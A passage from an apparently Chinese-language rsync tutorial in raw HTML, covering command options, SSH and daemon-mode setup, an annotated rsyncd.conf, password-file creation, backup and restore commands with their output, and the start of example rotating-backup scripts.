class="line">--ignore-errors &#x53CA;&#x65F6;&#x51FA;&#x73B0;IO&#x9519;&#x8BEF;&#x4E5F;&#x8FDB;&#x884C;&#x5220;&#x9664;</span><br><span class="line">--max-delete=NUM &#x6700;&#x591A;&#x5220;&#x9664;NUM&#x4E2A;&#x6587;&#x4EF6;</span><br><span class="line">--partial &#x4FDD;&#x7559;&#x90A3;&#x4E9B;&#x56E0;&#x6545;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x662F;&#x52A0;&#x5FEB;&#x968F;&#x540E;&#x7684;&#x518D;&#x6B21;&#x4F20;&#x8F93;</span><br><span class="line">--force &#x5F3A;&#x5236;&#x5220;&#x9664;&#x76EE;&#x5F55;&#xFF0C;&#x5373;&#x4F7F;&#x4E0D;&#x4E3A;&#x7A7A;</span><br><span class="line">--numeric-ids &#x4E0D;&#x5C06;&#x6570;&#x5B57;&#x7684;&#x7528;&#x6237;&#x548C;&#x7EC4;ID&#x5339;&#x914D;&#x4E3A;&#x7528;&#x6237;&#x540D;&#x548C;&#x7EC4;&#x540D;</span><br><span class="line">--timeout=TIME IP&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x4E3A;&#x79D2;</span><br><span class="line">-I, --ignore-times &#x4E0D;&#x8DF3;&#x8FC7;&#x90A3;&#x4E9B;&#x6709;&#x540C;&#x6837;&#x7684;&#x65F6;&#x95F4;&#x548C;&#x957F;&#x5EA6;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--size-only &#x5F53;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x8981;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x4EC5;&#x4EC5;&#x5BDF;&#x770B;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x800C;&#x4E0D;&#x8003;&#x8651;&#x6587;&#x4EF6;&#x65F6;&#x95F4;</span><br><span class="line">--modify-window=NUM &#x51B3;&#x5B9A;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x65F6;&#x95F4;&#x76F8;&#x540C;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x7A97;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0</span><br><span class="line">-T --temp-dir=DIR &#x5728;DIR&#x4E2D;&#x521B;&#x5EFA;&#x4E34;&#x65F6;&#x6587;&#x4EF6;</span><br><span class="line">--compare-dest=DIR &#x540C;&#x6837;&#x6BD4;&#x8F83;DIR&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x6765;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x9700;&#x8981;&#x5907;&#x4EFD;</span><br><span class="line">-P &#x7B49;&#x540C;&#x4E8E; --partial</span><br><span class="line">--progress &#x663E;&#x793A;&#x5907;&#x4EFD;&#x8FC7;&#x7A0B;</span><br><span class="line">-z, --compress &#x5BF9;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x5728;&#x4F20;&#x8F93;&#x65F6;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x5904;&#x7406;</span><br><span class="line">--exclude=PATTERN &#x6307;&#x5B9A;&#x6392;&#x9664;&#x4E0D;&#x9700;&#x8981;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;&#x6A21;&#x5F0F;</span><br><span class="line">--include=PATTERN &#x6307;&#x5B9A;&#x4E0D;&#x6392;&#x9664;&#x800C;&#x9700;&#x8981;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;&#x6A21;&#x5F0F;</span><br><span class="line">--exclude-from=FILE &#x6392;&#x9664;FILE&#x4E2D;&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--include-from=FILE &#x4E0D;&#x6392;&#x9664;FILE&#x6307;&#x5B9A;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">--version &#x6253;&#x5370;&#x7248;&#x672C;&#x4FE1;&#x606F;</span><br><span class="line">--address &#x7ED1;&#x5B9A;&#x5230;&#x7279;&#x5B9A;&#x7684;&#x5730;&#x5740;</span><br><span class="line">--config=FILE &#x6307;&#x5B9A;&#x5176;&#x4ED6;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4E0D;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;rsyncd.conf&#x6587;&#x4EF6;</span><br><span class="line">--port=PORT &#x6307;&#x5B9A;&#x5176;&#x4ED6;&#x7684;rsync&#x670D;&#x52A1;&#x7AEF;&#x53E3;</span><br><span class="line">--blocking-io &#x5BF9;&#x8FDC;&#x7A0B;shell&#x4F7F;&#x7528;&#x963B;&#x585E;IO</span><br><span class="line">-stats &#x7ED9;&#x51FA;&#x67D0;&#x4E9B;&#x6587;&#x4EF6;&#x7684;&#x4F20;&#x8F93;&#x72B6;&#x6001;</span><br><span class="line">--progress &#x5728;&#x4F20;&#x8F93;&#x65F6;&#x73B0;&#x5B9E;&#x4F20;&#x8F93;&#x8FC7;&#x7A0B;</span><br><span class="line">--<span class="built_in">log</span>-format=formAT &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x683C;&#x5F0F;</span><br><span class="line">--password-file=FILE &#x4ECE;FILE&#x4E2D;&#x5F97;&#x5230;&#x5BC6;&#x7801;</span><br><span class="line">--bwlimit=KBPS &#x9650;&#x5236;I/O&#x5E26;&#x5BBD;&#xFF0C;KBytes per second</span><br><span class="line">-h, --<span class="built_in">help</span> &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Rsync-&#x4F7F;&#x7528;&#x5B9E;&#x4F8B;"><a href="#Rsync-&#x4F7F;&#x7528;&#x5B9E;&#x4F8B;" class="headerlink" title="Rsync &#x4F7F;&#x7528;&#x5B9E;&#x4F8B;"></a>Rsync &#x4F7F;&#x7528;&#x5B9E;&#x4F8B;</h2><h4 id="SSH-&#x65B9;&#x5F0F;"><a href="#SSH-&#x65B9;&#x5F0F;" class="headerlink" title="SSH &#x65B9;&#x5F0F;"></a>SSH &#x65B9;&#x5F0F;</h4><p>&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x542F;&#x52A8; ssh &#x670D;&#x52A1;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service sshd start</span><br><span class="line">&#x542F;&#x52A8; sshd&#xFF1A; [&#x786E;&#x5B9A;]</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528; rsync &#x8FDB;&#x884C;&#x540C;&#x6B65;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528; rsync &#x547D;&#x4EE4;&#x6765;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x7AEF;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x4E86;&#xFF0C;SSH &#x65B9;&#x5F0F;&#x662F;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x6765;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x7684;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync</span><br><span class="line">work@172.16.78.192<span class="string">&apos;s password:</span></span><br><span class="line"><span class="string">receiving file list ...</span></span><br><span class="line"><span class="string">5 files to consider</span></span><br><span class="line"><span class="string">test/</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5)</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5)</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5)</span></span><br><span class="line"><span class="string">dd</span></span><br><span class="line"><span class="string">100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5)</span></span><br><span class="line"><span class="string">sent 96 bytes received 98190 bytes 11563.06 bytes/sec</span></span><br><span class="line"><span class="string">total size is 100663363 speedup is 1024.19</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x63CF;&#x8FF0;&#x4E86;&#x6574;&#x4E2A;&#x7684;&#x5907;&#x4EFD;&#x8FC7;&#x7A0B;&#xFF0C;&#x4EE5;&#x53CA;&#x603B;&#x5171;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x7684;&#x5927;&#x5C0F;&#x3002;</p><h4 id="&#x540E;&#x53F0;&#x670D;&#x52A1;&#x65B9;&#x5F0F;"><a href="#&#x540E;&#x53F0;&#x670D;&#x52A1;&#x65B9;&#x5F0F;" class="headerlink" title="&#x540E;&#x53F0;&#x670D;&#x52A1;&#x65B9;&#x5F0F;"></a>&#x540E;&#x53F0;&#x670D;&#x52A1;&#x65B9;&#x5F0F;</h4><p><strong>&#x542F;&#x52A8; rsync &#x670D;&#x52A1;</strong></p><p>&#x7F16;&#x8F91; / etc/xinetd.d/rsync &#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x5176;&#x4E2D;&#x7684; disable=yes &#x6539;&#x4E3A; disable=no&#xFF0C;&#x5E76;&#x91CD;&#x542F; xinetd &#x670D;&#x52A1;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># default: off</span></span><br><span class="line"><span class="comment"># description: The rsync server is a good addition to an ftp server, as it \</span></span><br><span class="line"><span class="comment"># allows crc checksumming etc.</span></span><br><span class="line">service rsync</span><br><span class="line">{</span><br><span class="line"><span class="built_in">disable</span> = no</span><br><span class="line">socket_type = stream</span><br><span class="line"><span class="built_in">wait</span> = no</span><br><span class="line">user = root</span><br><span class="line">server = /usr/bin/rsync</span><br><span class="line">server_args = --daemon</span><br><span class="line">log_on_failure += USERID</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /etc/init.d/xinetd restart</span><br><span class="line">&#x505C;&#x6B62; xinetd&#xFF1A; [&#x786E;&#x5B9A;]</span><br><span class="line">&#x542F;&#x52A8; xinetd&#xFF1A; [&#x786E;&#x5B9A;]</span><br></pre></td></tr></tbody></table></figure><p>&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x624B;&#x52A8;&#x542F;&#x52A8;&#x5E76;&#x6DFB;&#x52A0;&#x81EA;&#x542F;&#x52A8;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rsync --daemon --config=/etc/rsyncd.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/bin/rsync --daemon --config=/etc/rsyncd.conf&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p><p>&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x597D; rsync &#x7A0B;&#x5E8F;&#x540E;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA; rsync &#x7684;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x5DE5;&#x6765;&#x521B;&#x5EFA;&#xFF0C;&#x5176;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E3A; &#x201C;/etc/rsyncd.conf&#x201D;&#xFF0C;&#x521B;&#x5EFA;&#x8BE5;&#x6587;&#x4EF6;&#x5E76;&#x63D2;&#x5165;&#x5982;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Minimal configuration file for rsync daemon</span></span><br><span class="line"><span class="comment"># See rsync(1) and rsyncd.conf(5) man pages for help</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################ &#x4EE5;&#x4E0B;&#x662F;&#x516C;&#x5171;&#x53C2;&#x6570;&#x914D;&#x7F6E; ############################</span></span><br><span class="line"><span class="comment"># This line is required by the /etc/init.d/rsyncd script</span></span><br><span class="line">pid file = /var/run/rsyncd.pid</span><br><span class="line"><span class="comment"># &#x670D;&#x52A1;&#x7684;&#x7AEF;&#x53E3;</span></span><br><span class="line">port = 873</span><br><span class="line"><span class="comment"># &#x670D;&#x52A1;&#x7684;IP</span></span><br><span class="line">address = 10.44.201.202</span><br><span class="line"><span class="comment"># &#x8FD0;&#x884C;&#x7684;&#x5BBF;&#x4E3B;&#x8D26;&#x6237;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;&#x7B80;&#x5355;&#x5C31;root&#x4E86;</span></span><br><span class="line">uid = root</span><br><span class="line">gid = root</span><br><span class="line"><span class="comment"># &#x6253;&#x5F00;&#xFF08;yes&#xFF09;&#x540E;&#x6709;&#x4E2A;&#x529F;&#x80FD;&#x662F;&#x8BA9;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x53EF;&#x4EE5;&#x540C;&#x6B65;&#x8FC7;&#x53BB;&#xFF08;&#x4E0D;&#x901A;&#x8FC7;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x5BF9;&#x5E94;&#x7684;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#xFF09;</span></span><br><span class="line">use chroot = no</span><br><span class="line"><span class="comment"># &#x5BA2;&#x6237;&#x7AEF;&#x53EA;&#x8BFB;</span></span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line"><span class="comment">#limit access to private LANs</span></span><br><span class="line">hosts allow=10.51.56.165/255.255.255.0</span><br><span class="line"><span class="comment"># hosts deny=*</span></span><br><span class="line"><span class="comment"># &#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;</span></span><br><span class="line">max connections = 5</span><br><span class="line"><span class="comment"># &#x6B22;&#x8FCE;&#x4FE1;&#x606F;&#x5BF9;&#x5E94;&#x7684;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment"># motd file = /etc/rsyncd.motd</span></span><br><span class="line"><span class="comment"># &#x5BA2;&#x6237;&#x7AEF;&#x94FE;&#x63A5;&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;</span></span><br><span class="line">timeout = 300</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4EE5;&#x4E0B;&#x662F;&#x65E5;&#x5FD7;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x53EF;&#x9009;&#x4F7F;&#x7528;&#x72EC;&#x7ACB;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;</span></span><br><span class="line"><span class="comment"># This will give you a separate log file</span></span><br><span class="line"><span class="comment"># log file = /var/log/rsync.log</span></span><br><span class="line"><span class="comment"># This will log every file transferred - up to 85,000+ per user, per sync</span></span><br><span class="line"><span class="comment"># transfer logging = yes</span></span><br><span class="line"><span class="comment"># log format = %t %a %m %f %b</span></span><br><span class="line"><span class="comment"># syslog facility = local3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################# &#x540C;&#x6B65;&#x6A21;&#x5757;&#x914D;&#x7F6E; ################################</span></span><br><span class="line">[thrift]</span><br><span class="line"><span class="comment"># &#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x8DEF;&#x5F84;</span></span><br><span class="line">path = /data/JiemoLucenes</span><br><span class="line"><span class="comment"># &#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;list&#x547D;&#x4EE4;&#x5217;&#x8868;&#x663E;&#x793A;</span></span><br><span class="line">list=yes</span><br><span class="line"><span class="comment"># &#x5FFD;&#x7565;&#x9519;&#x8BEF;</span></span><br><span class="line">ignore errors</span><br><span class="line"><span class="comment"># &#x8BA4;&#x8BC1;&#x7528;&#x6237;</span></span><br><span class="line">auth users = root</span><br><span class="line"><span class="comment"># &#x8BA4;&#x8BC1;&#x4F7F;&#x7528;&#x7684;&#x8D26;&#x6237;&#x5BC6;&#x7801;&#x6587;&#x4EF6;</span></span><br><span class="line">secrets file = /etc/rsyncd.secrets</span><br><span class="line"><span class="comment"># &#x5907;&#x6CE8;&#x4FE1;&#x606F;</span></span><br><span class="line">comment = This is nexus data</span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x6709;&#x5FFD;&#x7565;&#x7684;&#x5B50;&#x76EE;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;exclude&#x5B9A;&#x4E49;</span></span><br><span class="line"><span class="comment"># exclude = easylife/  samba/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x521B;&#x5EFA;&#x5BC6;&#x7801;&#x6587;&#x4EF6;</strong><br>&#x91C7;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8BA4;&#x8BC1;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x683C;&#x5F0F;&#x4E3A; &#x201C;username:password&#x201D;&#xFF0C;&#x7528;&#x6237;&#x540D;&#x53EF;&#x4EE5;&#x548C;&#x5BC6;&#x7801;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x5B9A;&#x4E49;&#xFF0C;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x548C;&#x7CFB;&#x7EDF;&#x5E10;&#x6237;&#x4E00;&#x81F4;&#xFF0C;&#x540C;&#x65F6;&#x8981;&#x628A;&#x521B;&#x5EFA;&#x7684;&#x5BC6;&#x7801;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x8BBE;&#x7F6E;&#x4E3A; 600&#xFF0C;&#x8FD9;&#x5728;&#x524D;&#x9762;&#x7684;&#x6A21;&#x5757;&#x53C2;&#x6570;&#x505A;&#x4E86;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;work:abc123&quot;</span> &gt; /etc/rsyncd.passwd</span><br><span class="line">chmod 600 /etc/rsyncd.passwd</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5907;&#x4EFD;</strong><br>&#x5B8C;&#x6210;&#x4EE5;&#x4E0A;&#x5DE5;&#x4F5C;&#xFF0C;&#x73B0;&#x5728;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x4E86;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync</span><br><span class="line">Password:</span><br><span class="line">receiving file list ...</span><br><span class="line">6 files to consider</span><br><span class="line">./ files...</span><br><span class="line">a</span><br><span class="line">0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6)</span><br><span class="line">b</span><br><span class="line">67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6)</span><br><span class="line">c</span><br><span class="line">0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6)</span><br><span class="line">dd</span><br><span class="line">100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6)</span><br><span class="line">sent 172 bytes received 98276 bytes 17899.64 bytes/sec</span><br><span class="line">total size is 150995011 speedup is 1533.75</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6062;&#x590D;</strong><br>&#x5F53;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x65F6;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x670D;&#x52A1;&#x7AEF;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x4F46;&#x524D;&#x63D0;&#x662F;&#x670D;&#x52A1;&#x7AEF;&#x5141;&#x8BB8;&#x5BA2;&#x6237;&#x7AEF;&#x6709;&#x5199;&#x5165;&#x6743;&#x9650;&#xFF0C;&#x5426;&#x5219;&#x4E5F;&#x4E0D;&#x80FD;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x76F4;&#x63A5;&#x5BF9;&#x670D;&#x52A1;&#x7AEF;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x4F7F;&#x7528; rsync &#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6062;&#x590D;&#x7684;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www</span><br><span class="line">Password:</span><br><span class="line">building file list ...</span><br><span class="line">6 files to consider</span><br><span class="line">./</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6)</span><br><span class="line">c</span><br><span class="line">sent 258 bytes received 76 bytes 95.43 bytes/sec</span><br><span class="line">total size is 150995011 speedup is 452080.87</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x793A;&#x4F8B;&#x811A;&#x672C;</strong><br>&#x8FD9;&#x91CC;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x90FD;&#x662F; rsync &#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;<br>1&#x3001;&#x6BCF;&#x9694;&#x4E03;&#x5929;&#x5C06;&#x6570;&#x636E;&#x5F80;&#x4E2D;&#x5FC3;&#x670D;&#x52A1;&#x5668;&#x505A;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This script does personal backups to a rsync backup server. You will end up</span></span><br><span class="line"><span class="comment"># with a 7 day rotating incremental backup. The incrementals will go</span></span><br><span class="line"><span class="comment"># into subdirectories named after the day of the week, and the current</span></span><br><span class="line"><span class="comment"># full backup goes into a directory called &quot;current&quot;</span></span><br><span class="line"><span class="comment"># tridge@linuxcare.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># directory to backup</span></span><br><span class="line">BDIR=/home/<span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># excludes file - this contains a wildcard pattern per line of files to exclude</span></span><br><span class="line">EXCLUDES=<span class="variable">$HOME</span>/cron/excludes</span><br><span class="line"></span><br><span class="line"><span class="comment"># the name of the backup machine</span></span><br><span class="line">BSERVER=owl</span><br><span class="line"></span><br><span class="line"><span class="comment"># your password on the backup server</span></span><br><span class="line"><span class="built_in">export</span> RSYNC_PASSWORD=XXXXXX</span><br><span class="line"></span><br><span class="line"><span class="comment">#######################################################################</span></span><br><span class="line"></span><br><span class="line">BACKUPDIR=`date +%A`</span><br><span class="line">OPTS=<span class="string">&quot;--force --ignore-errors --delete-excluded --exclude-from=<span class="variable">$EXCLUDES</span></span></span><br><span class="line"><span class="string">--delete --backup --backup-dir=/<span class="variable">$BACKUPDIR</span> -a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># the following line clears the last weeks incremental directory</span></span><br><span class="line">[ -d <span class="variable">$HOME</span>/emptydir ] || mkdir <span class="variable">$HOME</span>/emptydir</span><br><span class="line">rsync --delete -a <span class="variable">$HOME</span>/emptydir/ <span class="variable">$BSERVER</span>::<span class="variable">$USER</span>/<span class="variable">$BACKUPDIR</span>/</span><br><span class="line">rmdir <span class="variable">$HOME</span>/emptydir</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the actual transfer</span></span><br><span class="line">rsync <span class="variable">$OPTS</span> <span class="variable">$BDIR</span> <span class="variable">$BSERVER</span>::<span class="variable">$USER</span>/current</span><br></pre></td></tr></tbody></table></figure><p></p><p>2&#x3001;&#x5907;&#x4EFD;&#x81F3;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x7684;&#x786C;&#x76D8;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin</span><br><span class="line"></span><br><span class="line">LIST=<span class="string">&quot;rootfs usr data data2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span 